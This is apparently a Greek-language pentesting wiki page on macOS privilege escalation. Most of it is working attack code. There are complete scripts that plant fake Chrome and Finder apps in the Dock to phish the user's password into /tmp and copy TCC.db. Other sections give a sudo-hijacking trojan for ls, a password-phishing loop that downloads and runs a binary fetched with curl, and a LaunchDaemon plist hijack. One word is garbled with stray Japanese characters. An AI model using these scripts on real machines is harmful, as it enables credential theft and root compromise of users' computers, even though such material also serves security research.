# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Αν αναζητάτε TCC privilege escalation, μεταβείτε εδώ:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Σημειώστε ότι **τα περισσότερα tricks σχετικά με privilege escalation που επηρεάζουν Linux/Unix θα επηρεάσουν επίσης** μηχανήματα MacOS. Δείτε λοιπόν:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Μπορείτε να βρείτε την αρχική [τεχνική Sudo Hijacking μέσα στο άρθρο Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος επίτευξης αυτής της επίθεσης θα ήταν να κάνετε **hijack άλλα binaries** που το θύμα θα εκτελέσει επίσης κατά την **εκτέλεση του sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το terminal είναι πολύ πιθανό να έχει εγκατεστημένο το **Homebrew**. Επομένως, είναι πιθανό να γίνει hijack binaries στο **`/opt/homebrew/bin`**.

### Impersonation του Dock

Χρησιμοποιώντας κάποιο **social engineering**, θα μπορούσατε να **υποδυθείτε, για παράδειγμα, το Google Chrome** μέσα στο Dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Μερικές προτάσεις:

- Ελέγξτε στο Dock αν υπάρχει το Chrome και, σε αυτήν την περίπτωση, **αφαιρέστε** αυτήν την καταχώριση και **προσθέστε** την **ψεύτικη** καταχώριση του **Chrome** στην ίδια θέση στο array του Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Μερικές προτάσεις:

- **Δεν μπορείτε να αφαιρέσετε το Finder από το Dock**, οπότε, αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε το fake Finder ακριβώς δίπλα στο πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την καταχώριση του fake Finder στην αρχή του array του Dock**.
- Μια άλλη επιλογή είναι να μην το τοποθετήσετε στο Dock και απλώς να το ανοίξετε· το «Finder asking to control Finder» δεν είναι και τόσο παράξενο.
- Μια άλλη επιλογή για να **κάνετε escalate σε root χωρίς να ζητήσετε** το password με ένα φρικτό παράθυρο, είναι να κάνετε το Finder να ζητήσει πραγματικά το password για την εκτέλεση μιας privileged ενέργειας:
- Ζητήστε από το Finder να αντιγράψει ένα νέο αρχείο **`sudo`** στο **`/etc/pam.d`**. (Το prompt που ζητά το password θα υποδεικνύει ότι «το Finder θέλει να αντιγράψει το sudo».)
- Ζητήστε από το Finder να αντιγράψει ένα νέο **Authorization Plugin**. (Θα μπορούσατε να ελέγξετε το όνομα του αρχείου, ώστε το prompt που ζητά το password να υποδεικνύει ότι «το Finder θέλει να αντιγράψει το Finder.bundle».)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing μέσω προτροπής κωδικού πρόσβασης + επαναχρησιμοποίηση sudo

Το malware συχνά εκμεταλλεύεται την αλληλεπίδραση του χρήστη για να **υποκλέψει έναν κωδικό πρόσβασης με δυνατότητα sudo** και να τον επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:

1. Εντοπισμός του συνδεδεμένου χρήστη με `whoami`.
2. **Επανάληψη των προτροπών κωδικού πρόσβασης** μέχρι η `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
3. Αποθήκευση του credential (π.χ., `/tmp/.pass`) και εκτέλεση privileged ενεργειών με `sudo -S` (κωδικός πρόσβασης μέσω stdin).

Ελάχιστη αλυσίδα παραδείγματος:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ο κλεμμένος κωδικός πρόσβασης μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για **εκκαθάριση του Gatekeeper quarantine με `xattr -c`**, αντιγραφή LaunchDaemons ή άλλων privileged αρχείων και εκτέλεση πρόσθετων σταδίων non-interactively.

## Νεότερα macOS-specific vectors (2023–2025)

### Το deprecated `AuthorizationExecuteWithPrivileges` εξακολουθεί να είναι usable

Το `AuthorizationExecuteWithPrivileges` καταργήθηκε στο 10.7, αλλά **εξακολουθεί να λειτουργεί στα Sonoma/Sequoia**. Πολλά commercial updaters καλούν το `/usr/libexec/security_authtrampoline` με ένα untrusted path. Αν το target binary είναι writable από τον χρήστη, μπορείς να τοποθετήσεις ένα trojan και να εκμεταλλευτείς το legitimate prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Συνδύασέ τα με τα **masquerading tricks παραπάνω** για να παρουσιάσεις ένα αξιόπιστο password dialog.


### Privileged helper / XPC triage

Πολλά σύγχρονα third-party macOS privescs ακολουθούν το ίδιο μοτίβο: ένα **root LaunchDaemon** εκθέτει ένα **Mach/XPC service** από το **`/Library/PrivilegedHelperTools`**, και στη συνέχεια το helper είτε **δεν επικυρώνει τον client**, είτε τον επικυρώνει **πολύ αργά** (PID race), είτε εκθέτει μια **root method** που χρησιμοποιεί ένα **user-controlled path/script**. Αυτή είναι η bug class πίσω από πολλά πρόσφατα helper bugs σε VPN clients, game launchers και updaters.<sup>[4]</sup>

Γρήγορο checklist για triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Δώστε ιδιαίτερη προσοχή σε helpers που:

- συνεχίζουν να αποδέχονται requests **μετά την απεγκατάσταση**, επειδή το job παρέμεινε φορτωμένο στο `launchd`
- εκτελούν scripts ή διαβάζουν configuration από το **`/Applications/...`** ή άλλες διαδρομές εγγράψιμες από μη-root χρήστες
- βασίζονται σε validation peer με βάση το **PID** ή μόνο το **bundle-id**, το οποίο μπορεί να είναι ευάλωτο σε race condition

Για περισσότερες λεπτομέρειες σχετικά με authorization bugs σε helpers, δείτε [αυτή τη σελίδα](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Κληρονόμηση περιβάλλοντος script του PackageKit (CVE-2024-27822)

Μέχρι η Apple να το διορθώσει στα **Sonoma 14.5**, **Ventura 13.6.7** και **Monterey 12.7.5**, οι εγκαταστάσεις που ξεκινούσε ο χρήστης μέσω των **`Installer.app`** / **`PackageKit.framework`** μπορούσαν να εκτελέσουν **PKG scripts ως root μέσα στο περιβάλλον του τρέχοντος χρήστη**. Αυτό σημαίνει ότι ένα package που χρησιμοποιεί **`#!/bin/zsh`** θα φόρτωνε το **`~/.zshenv`** του attacker και θα το εκτελούσε ως **root** όταν το θύμα εγκαθιστούσε το package.<sup>[3]</sup>

Αυτό είναι ιδιαίτερα ενδιαφέρον ως **logic bomb**: χρειάζεστε μόνο ένα foothold στον λογαριασμό του χρήστη και ένα εγγράψιμο shell startup file, και στη συνέχεια περιμένετε να εκτελεστεί από τον χρήστη οποιοδήποτε ευάλωτο **zsh-based** installer. Αυτό γενικά **δεν** ισχύει για deployments μέσω **MDM/Munki**, επειδή αυτά εκτελούνται μέσα στο περιβάλλον του χρήστη root.<sup>[3]</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Αν θέλετε μια βαθύτερη ανάλυση της ειδικής κατάχρησης installers, δείτε επίσης [αυτήν τη σελίδα](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Αν ένα LaunchDaemon plist ή ο στόχος του `ProgramArguments` είναι **user-writable**, μπορείτε να κάνετε privilege escalation αντικαθιστώντας το και στη συνέχεια αναγκάζοντας το launchd να κάνει reload:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Αυτό αντικατοπτρίζει το μοτίβο exploit που δημοσιεύτηκε για το **CVE-2025-24085**, όπου ένα εγγράψιμο plist χρησιμοποιήθηκε καταχρηστικά για την εκτέλεση κώδικα του επιτιθέμενου ως root.

### XNU SMR credential race (CVE-2025-24118)

Ένα **race στο `kauth_cred_proc_update`** επιτρέπει σε έναν τοπικό επιτιθέμενο να καταστρέψει τον δείκτη credential μόνο για ανάγνωση (`proc_ro.p_ucred`), εκτελώντας παράλληλα βρόχους `setgid()`/`getgid()` σε πολλά threads μέχρι να προκύψει ένα torn `memcpy`. Η επιτυχής καταστροφή παρέχει **uid 0** και πρόσβαση στη μνήμη του kernel. Ελάχιστη δομή PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Σε συνδυασμό με **heap grooming**, ώστε να τοποθετηθούν ελεγχόμενα δεδομένα στο σημείο όπου γίνεται επαν読み́νωση του pointer. Σε ευάλωτα builds, αυτό αποτελεί αξιόπιστο **local kernel privesc** χωρίς απαιτήσεις για SIP bypass.<sup>[2]</sup>

### SIP bypass μέσω του Migration assistant ("Migraine", CVE-2023-32369)

Αν έχετε ήδη root, το SIP εξακολουθεί να εμποδίζει τις εγγραφές σε system locations. Το bug **Migraine** εκμεταλλεύεται το entitlement του Migration Assistant `com.apple.rootless.install.heritable` για να δημιουργήσει child process που κληρονομεί SIP bypass και αντικαθιστά protected paths (π.χ. `/System/Library/LaunchDaemons`).<sup>[1]</sup> Η αλυσίδα:

1. Αποκτήστε root σε live system.
2. Ενεργοποιήστε το `systemmigrationd` με crafted state, ώστε να εκτελέσει attacker-controlled binary.
3. Χρησιμοποιήστε το inherited entitlement για να τροποποιήσετε SIP-protected files, διατηρώντας την επιμονή ακόμη και μετά από reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Πολλαπλά Apple daemons δέχονται αντικείμενα **NSPredicate** μέσω XPC και επικυρώνουν μόνο το πεδίο `expressionType`, το οποίο ελέγχεται από τον attacker. Με τη δημιουργία predicate που αξιολογεί arbitrary selectors, μπορείτε να επιτύχετε **code execution σε root/system XPC services** (π.χ. `coreduetd`, `contextstored`). Σε συνδυασμό με αρχικό app sandbox escape, αυτό παρέχει **privilege escalation χωρίς user prompts**. Αναζητήστε XPC endpoints που κάνουν deserialize predicates και δεν διαθέτουν robust visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation

**Οποιοσδήποτε user** (ακόμη και unprivileged users) μπορεί να δημιουργήσει και να κάνει mount ένα Time Machine snapshot με `-o noowners` και να **αποκτήσει πρόσβαση σε ΟΛΑ τα files** αυτού του snapshot, παρακάμπτοντας τους ownership checks στο live volume. Το μόνο privilege που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να διαθέτει **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Οι εντολές και η πλήρης επεξήγηση βρίσκονται στη σελίδα TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Αυτό μπορεί να είναι χρήσιμο για privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
